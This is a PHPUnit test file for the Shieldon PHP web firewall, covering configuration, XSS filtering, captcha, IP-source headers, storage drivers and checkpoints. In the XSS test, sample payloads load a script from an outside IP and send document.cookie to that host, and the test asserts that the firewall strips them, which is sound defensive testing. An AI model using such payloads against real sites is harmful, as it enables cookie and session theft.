<?php
/**
 * This file is part of the Shieldon package.
 *
 * (c) Terry L. <contact@terryl.in>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 *
 * php version 7.1.0
 *
 * @category  Web-security
 * @package   Shieldon
 * @author    Terry Lin <contact@terryl.in>
 * @copyright 2019 terrylinooo
 * @license   https://github.com/terrylinooo/shieldon/blob/2.x/LICENSE MIT
 * @link      https://github.com/terrylinooo/shieldon
 * @see       https://shieldon.io
 */

declare(strict_types=1);

namespace Shieldon\FirewallTest;

class FirewallTest extends \Shieldon\FirewallTest\ShieldonTestCase
{
    public function testFromJsonConfig()
    {
        // Remove the configration file if it exists.
        if (file_exists(BOOTSTRAP_DIR . '/../tmp/shieldon/config.firewall.json')) {
            unlink(BOOTSTRAP_DIR . '/../tmp/shieldon/config.firewall.json');
        }

        $firewall = new \Shieldon\Firewall\Firewall();
        $firewall->configure(BOOTSTRAP_DIR . '/../tmp/shieldon');

        // setChannel()
        $firewall->setConfig('channel_id', 'test_firewall');
        $firewall->getKernel()->setChannel('test_firewall');
        $firewall->getKernel()->driver->rebuild();
        $firewall->getKernel()->setStrict(false);

        // Action Logger
        $firewall->setConfig('loggers.action.config.directory_path', BOOTSTRAP_DIR . '/../tmp/shieldon/logs');
        $firewall->setup();

        // Get Firewall from Container.
        $firewall = \Shieldon\Firewall\Container::get('firewall');
        $kernel = \Shieldon\Firewall\Container::get('shieldon');

        $firewall->getKernel()->setIp('141.11.72.12');

        $reflection = new \ReflectionObject($kernel);
        $methodSetSessionId = $reflection->getMethod('setSessionId');
        $methodSetSessionId->setAccessible(true);
        $methodSetSessionId->invokeArgs($kernel, [md5(date('YmdHis') . mt_rand(1, 1000))]);
    }

    public function testXssProtection()
    {
        $this->testFromJsonConfig();

        $firewall = \Shieldon\Firewall\Container::get('firewall');
        $firewall->getKernel()->driver->rebuild();

        $firewall->getKernel()->setIp('131.122.87.35');

        /*
        |--------------------------------------------------------------------------
        | Xss-Protection
        |--------------------------------------------------------------------------
        */

        // Test Xss-Protection options
        $_POST['test_one'] = '<script> alert(); </script>';
        $_COOKIE['test_two'] = '<script src="http://19.89.6.4/xss.js">';
        $_GET['test_three'] = '<script>new Image().src="http://19.89.6.4/test.php?output="+document.cookie;</script>';
        $this->refreshRequest();

        $firewall->run();

        $this->assertEquals($_POST['test_one'], '[removed] alert&#40;&#41;; [removed]');
        $this->assertEquals($_COOKIE['test_two'], '[removed]');
        // phpcs:ignore
        $this->assertEquals($_GET['test_three'], '[removed]new Image().src="http://19.89.6.4/test.php?output="+[removed];[removed]');
     
        // Test Xss-Protection signle variable.
        $firewall->setConfig('xss_protection.post', false);
        $firewall->setConfig('xss_protection.cookie', false);
        $firewall->setConfig('xss_protection.get', false);

        $_POST['_test'] = '<script> alert(123); </script>';
        $_COOKIE['_test'] = '<script> alert(123); </script>';
        $_GET['_test'] = '<script> alert(123); </script>';
        $this->refreshRequest();

        $firewall->getKernel()->setIp('140.132.72.12');

        $firewall->setup();
        $firewall->run();

        $this->assertEquals($_GET['_test'], '[removed] alert&#40;123&#41;; [removed]');
        $this->assertEquals($_POST['_test'], '[removed] alert&#40;123&#41;; [removed]');
        $this->assertEquals($_COOKIE['_test'], '[removed] alert&#40;123&#41;; [removed]');

        $firewall->setConfig('xss_protection.post', true);
        $firewall->setConfig('xss_protection.cookie', true);
        $firewall->setConfig('xss_protection.get', true);


        $firewall->setConfig('xss_protection.post', false);
        $firewall->setConfig('xss_protection.cookie', false);
        $firewall->setConfig('xss_protection.get', false);
        $firewall->setConfig('xss_protected_list', []);
        $firewall->setup();
        $firewall->run();
    }

    public function testImageCaptchaOption()
    {
        $this->testFromJsonConfig();

        $firewall = \Shieldon\Firewall\Container::get('firewall');
        $firewall->getKernel()->driver->rebuild();

        $firewall->getKernel()->setIp('131.122.87.9');

        /*
        |--------------------------------------------------------------------------
        | Test Image captcha options.
        |--------------------------------------------------------------------------
        */
        $firewall->setConfig('captcha_modules.image.config.type', 'alpha');
        $firewall->setup();
        $firewall->run();

        $firewall->getKernel()->setIp('140.112.172.93');

        $firewall->setConfig('captcha_modules.image.config.type', 'numeric');
        $firewall->setup();
        $firewall->run();
    }

    public function testIpSourceOption()
    {
        $_SERVER['HTTP_CF_CONNECTING_IP'] = '19.89.6.4';
        $this->refreshRequest();

        $this->testFromJsonConfig();
        $firewall = \Shieldon\Firewall\Container::get('firewall');
        $firewall->getKernel()->driver->rebuild();

        $firewall->getKernel()->setIp('131.132.87.12');

        /*
        |--------------------------------------------------------------------------
        | IP Source
        |--------------------------------------------------------------------------
        */

        // HTTP_CF_CONNECTING_IP
        $firewall->setConfig('ip_variable_source.REMOTE_ADDR', false);
        $firewall->setConfig('ip_variable_source.HTTP_CF_CONNECTING_IP', true);
        $firewall->setConfig('ip_variable_source.HTTP_X_FORWARDED_FOR', false);
        $firewall->setConfig('ip_variable_source.HTTP_X_FORWARDED_HOST', false);
        $firewall->setup();
        $firewall->run();

        $this->assertEquals($firewall->getKernel()->getIp(), '19.89.6.4');

        $_SERVER['HTTP_X_FORWARDED_FOR'] = '19.80.4.12';
        $this->refreshRequest();

        $this->testFromJsonConfig();
        $firewall = \Shieldon\Firewall\Container::get('firewall');
        $firewall->getKernel()->driver->rebuild();

        // HTTP_X_FORWARDED_FOR
        $firewall->setConfig('ip_variable_source.REMOTE_ADDR', false);
        $firewall->setConfig('ip_variable_source.HTTP_CF_CONNECTING_IP', false);
        $firewall->setConfig('ip_variable_source.HTTP_X_FORWARDED_FOR', true);
        $firewall->setConfig('ip_variable_source.HTTP_X_FORWARDED_HOST', false);

        $firewall->setup();
        $firewall->run();

        $this->assertEquals($firewall->getKernel()->getIp(), '19.80.4.12');

        // HTTP_X_FORWARDED_HOST
        $_SERVER['HTTP_X_FORWARDED_HOST'] = '5.20.13.14';
        $this->refreshRequest();

        $this->testFromJsonConfig();
        $firewall = \Shieldon\Firewall\Container::get('firewall');
        $firewall->getKernel()->driver->rebuild();

        $firewall->setConfig('ip_variable_source.REMOTE_ADDR', false);
        $firewall->setConfig('ip_variable_source.HTTP_CF_CONNECTING_IP', false);
        $firewall->setConfig('ip_variable_source.HTTP_X_FORWARDED_FOR', false);
        $firewall->setConfig('ip_variable_source.HTTP_X_FORWARDED_HOST', true);

        $firewall->setup();
        $firewall->run();

        $this->assertEquals($firewall->getKernel()->getIp(), '5.20.13.14');
    }

    public function testDataDriverOption()
    {
        $this->getWritableTestFilePath('_file_driver_initialized.txt', 'shieldon');
        $this->getWritableTestFilePath('_file_driver_initialized.txt', 'test_sqlite_driver');

        $this->testFromJsonConfig();

        $firewall = \Shieldon\Firewall\Container::get('firewall');

        /*
        |--------------------------------------------------------------------------
        | Drivers
        |--------------------------------------------------------------------------
        */

        // SQLite
        $firewall->setConfig('driver_type', 'sqlite');
        $firewall->setConfig('drivers.sqlite.directory_path', BOOTSTRAP_DIR . '/../tmp/test_sqlite_driver');
        $firewall->setup();
        $firewall->getKernel()->setIp($this->getRandomIpAddress());
        $firewall->getKernel()->driver->rebuild();
        $firewall->run();
        
        // Redis
        $firewall->setConfig('driver_type', 'redis');
        $firewall->setup();
        $firewall->getKernel()->setIp($this->getRandomIpAddress());
        $firewall->getKernel()->driver->rebuild();
        $firewall->run();
         
        // MySQL
        $firewall->setConfig('driver_type', 'mysql');
        $firewall->setup();
        $firewall->getKernel()->setIp($this->getRandomIpAddress());
        $firewall->getKernel()->driver->rebuild();
        $firewall->run();
    }

    public function testSetCronJobOption()
    {
        $this->testFromJsonConfig();
        $firewall = \Shieldon\Firewall\Container::get('firewall');
        $firewall->getKernel()->driver->rebuild();
        
        /*
        |--------------------------------------------------------------------------
        | setCronJob()
        |--------------------------------------------------------------------------
        */

        $firewall->getKernel()->setIp('131.111.11.114');
        $kernel = $firewall->getKernel();

        // Set a fake session to avoid occuring errors.
        
        $reflection = new \ReflectionObject($kernel);
        $methodSetSessionId = $reflection->getMethod('setSessionId');
        $methodSetSessionId->setAccessible(true);
        $methodSetSessionId->invokeArgs($kernel, [md5(date('YmdHis') . mt_rand(1, 1000))]);

        $firewall->setConfig('cronjob.reset_circle.config.last_update', '');
        $firewall->setup();
        $firewall->run();
    }

    public function testFromPhpPConfig()
    {
        $firewall = new \Shieldon\Firewall\Firewall();
        $firewall->configure(BOOTSTRAP_DIR . '/config.php', 'php');

        // Get Firewall from Container.
        $firewall = \Shieldon\Firewall\Container::get('firewall');
        $kernel = \Shieldon\Firewall\Container::get('shieldon');

        $kernel->setIp('131.111.11.115');
        $reflection = new \ReflectionObject($kernel);
        $methodSetSessionId = $reflection->getMethod('setSessionId');
        $methodSetSessionId->setAccessible(true);
        $methodSetSessionId->invokeArgs($kernel, [md5(date('YmdHis') . mt_rand(1, 1000))]);

        $firewall->run();
    }

    public function testSetMessengers()
    {
        $this->testFromJsonConfig();
        $firewall = \Shieldon\Firewall\Container::get('firewall');
        
        $firewall->setConfig('messengers.telegram.enable', true);
        $firewall->setConfig('messengers.telegram.confirm_test', true);

        $firewall->setConfig('messengers.line_notify.enable', true);
        $firewall->setConfig('messengers.line_notify.confirm_test', true);

        $firewall->setConfig('messengers.sendgrid.enable', true);
        $firewall->setConfig('messengers.sendgrid.confirm_test', true);

        $firewall->setConfig('messengers.native_php_mail.enable', true);
        $firewall->setConfig('messengers.native_php_mail.confirm_test', true);

        $firewall->setConfig('messengers.smtp.enable', true);
        $firewall->setConfig('messengers.smtp.confirm_test', true);

        $firewall->setConfig('messengers.mailgun.enable', true);
        $firewall->setConfig('messengers.mailgun.confirm_test', true);

        $firewall->setConfig('messengers.rocket_chat.enable', true);
        $firewall->setConfig('messengers.rocket_chat.confirm_test', true);

        $firewall->setConfig('messengers.slack.enable', true);
        $firewall->setConfig('messengers.slack.confirm_test', true);

        $firewall->setConfig('messengers.slack_webhook.enable', true);
        $firewall->setConfig('messengers.slack_webhook.confirm_test', true);

        $firewall->setup();
    }

    public function testCaptchaResponse()
    {
        // $this->mockSession();
        $this->getWritableTestFilePath('_file_driver_initialized.txt', 'shieldon');

        $this->testFromJsonConfig();

        $firewall = \Shieldon\Firewall\Container::get('firewall');

        $firewall->getKernel()->driver->rebuild();
        $firewall->getKernel()->setIp('140.132.75.15');
        $firewall->setup();

        for ($i = 1; $i <= 6; $i++) {
            $response = $firewall->run();
        }

        $this->assertSame($response->getStatusCode(), 403);

        $_POST['shieldon_captcha'] = 'ok';
        $this->refreshRequest();

        $firewall->getKernel()->captcha = [];
        $firewall->getKernel()->setCaptcha(new \Shieldon\Firewall\Captcha\Foundation());

        $response = $firewall->run();

        $this->assertSame($response->getStatusCode(), 303);
    }

    public function testHasCheckpoint()
    {
        $this->testFromJsonConfig();
        $firewall = \Shieldon\Firewall\Container::get('firewall');

        $reflection = new \ReflectionObject($firewall);

        $method = $reflection->getMethod('getCheckpoint');
        $method->setAccessible(true);
        $checkpointFile = $method->invokeArgs($firewall, []);

        if (!file_exists($checkpointFile)) {
            $method = $reflection->getMethod('setCheckpoint');
            $method->setAccessible(true);
            $method->invokeArgs($firewall, [true]);
        }

        $method = $reflection->getMethod('hasCheckpoint');
        $method->setAccessible(true);
        $hasCheckpoint = $method->invokeArgs($firewall, []);

        $this->assertTrue($hasCheckpoint);

        $method = $reflection->getMethod('getCheckpoint');
        $method->setAccessible(true);
        $checkpointFile = $method->invokeArgs($firewall, []);

        if (file_exists($checkpointFile)) {
            unlink($checkpointFile);
        }

        $method = $reflection->getMethod('hasCheckpoint');
        $method->setAccessible(true);
        $hasCheckpoint = $method->invokeArgs($firewall, []);

        $this->assertFalse($hasCheckpoint);

        $method = $reflection->getMethod('setCheckpoint');
        $method->setAccessible(true);
        $method->invokeArgs($firewall, [true]);

        if (file_exists($checkpointFile)) {
            $this->assertTrue(true);
        } else {
            $this->assertTrue(false);
        }

        if (file_exists($checkpointFile)) {
            unlink($checkpointFile);
        }

        if (!file_exists($checkpointFile)) {
            $this->assertTrue(true);
        } else {
            $this->assertTrue(false);
        }

        $firewall->setup();

        if (file_exists($checkpointFile)) {
            $this->assertTrue(true);
        } else {
            $this->assertTrue(false);
        }
    }

    public function testDisplayPerformanceReport()
    {
        $this->testFromJsonConfig();
        $firewall = \Shieldon\Firewall\Container::get('firewall');
        $firewall->enablePerformanceReport();

        $firewall->getKernel()->driver->rebuild();
        $firewall->getKernel()->setIp('140.199.99.99');
        $firewall->setup();

        for ($i = 1; $i <= 6; $i++) {
            $response = $firewall->run();
        }

        ob_start();

        if ($response->getStatusCode() !== 200) {
            $httpResolver = new \Shieldon\Firewall\HttpResolver();
            $httpResolver($response);
        }

        $output = ob_get_contents();
        ob_end_clean();

        $this->assertStringContainsString('Memory consumed', $output);
    }
}
